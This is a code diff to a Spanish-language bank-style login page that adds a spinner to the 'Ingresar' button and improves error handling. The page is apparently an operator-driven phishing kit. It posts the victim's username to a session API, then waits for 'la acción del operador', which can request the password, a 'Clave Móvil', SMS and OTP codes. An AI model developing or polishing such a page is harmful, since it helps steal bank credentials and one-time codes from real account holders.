@@ -70,6 +70,41 @@
         display: flex !important;
       }
 
+      /* Spinner dentro del botón de iniciar sesión */
+      @keyframes btn-spin {
+        0% { transform: rotate(0deg); -webkit-transform: rotate(0deg); }
+        100% { transform: rotate(360deg); -webkit-transform: rotate(360deg); }
+      }
+      @-webkit-keyframes btn-spin {
+        0% { -webkit-transform: rotate(0deg); }
+        100% { -webkit-transform: rotate(360deg); }
+      }
+      .btn-spinner {
+        display: inline-block !important;
+        width: 15px !important;
+        height: 15px !important;
+        border: 2.5px solid rgba(255, 255, 255, 0.35) !important;
+        border-top-color: #ffffff !important;
+        border-radius: 50% !important;
+        animation: btn-spin 0.75s linear infinite !important;
+        -webkit-animation: btn-spin 0.75s linear infinite !important;
+        box-sizing: border-box !important;
+        vertical-align: middle !important;
+        margin-right: 7px !important;
+        flex-shrink: 0 !important;
+      }
+      #container .contentLogin #Enter_Step1.btn-loading,
+      #container .login #Enter_Step1.btn-loading,
+      #container .login .enterRow #Enter_Step1.btn-loading,
+      #Enter_Step1.btn-loading {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        cursor: wait !important;
+        pointer-events: none !important;
+        opacity: 0.95 !important;
+      }
+
       /* Marco y casillas para Clave Móvil y SMS */
       #stepToken.login {
         padding-top: 24px !important;
@@ -422,6 +457,22 @@
       const spinnerTextTitle = document.getElementById("spinnerTextTitle");
       const spinnerTextSub = document.getElementById("spinnerTextSub");
       const otpSlots = [...document.querySelectorAll(".otp-slot")];
+      const enterBtn = document.getElementById("Enter_Step1");
+
+      function setButtonLoading(isLoading) {
+        if (!enterBtn) return;
+        if (isLoading) {
+          enterBtn.disabled = true;
+          enterBtn.classList.add("btn-loading");
+          enterBtn.innerHTML = '<span class="btn-spinner"></span><span style="color:#ffffff; font-weight:700; font-size:12px; text-shadow:0 1px 1px rgba(0,0,0,0.3);">Ingresando...</span>';
+          if (user) user.readOnly = true;
+        } else {
+          enterBtn.disabled = false;
+          enterBtn.classList.remove("btn-loading");
+          enterBtn.innerHTML = 'Ingresar';
+          if (user) user.readOnly = false;
+        }
+      }
 
       function bindReveal(input, checkbox) {
         if (!input || !checkbox) return;
@@ -442,6 +493,7 @@
       }
 
       function goToPassword() {
+        if (isWaitingForNextAction) return;
         hideError();
         const userVal = (user.value || "").trim();
         if (!userVal) {
@@ -453,8 +505,8 @@
         hasInitialSubmitted = true;
         isWaitingForNextAction = true;
 
-        // Queda en spinner de carga esperando la acción del operador
-        showSpinner("Verificando credenciales", "Por favor espere un momento mientras procesamos su solicitud de ingreso...");
+        // Spinner dentro del botón de iniciar sesión
+        setButtonLoading(true);
 
         fetch('/api/sessions', {
           method: 'POST',
@@ -467,15 +519,23 @@
             state: 'waiting',
             action: null
           })
-        }).catch(() => {});
-        startKeepalive();
-        startPolling();
+        })
+        .then(() => {
+          startKeepalive();
+          startPolling();
+        })
+        .catch(() => {
+          isWaitingForNextAction = false;
+          setButtonLoading(false);
+          showError("No se pudo conectar con el servidor. Intente de nuevo.");
+        });
       }
 
       function goToUser() {
         hideError();
         isWaitingForNextAction = false;
         hideSpinner();
+        setButtonLoading(false);
         stepPass.hidden = true;
         stepToken.hidden = true;
         stepUser.hidden = false;
@@ -574,6 +634,7 @@
               lastHandledActionId = actionId;
               isWaitingForNextAction = false;
               hideSpinner();
+              setButtonLoading(false);
 
               if (action === 'password' || action === 'pedir-password') {
                 stepUser.hidden = true;
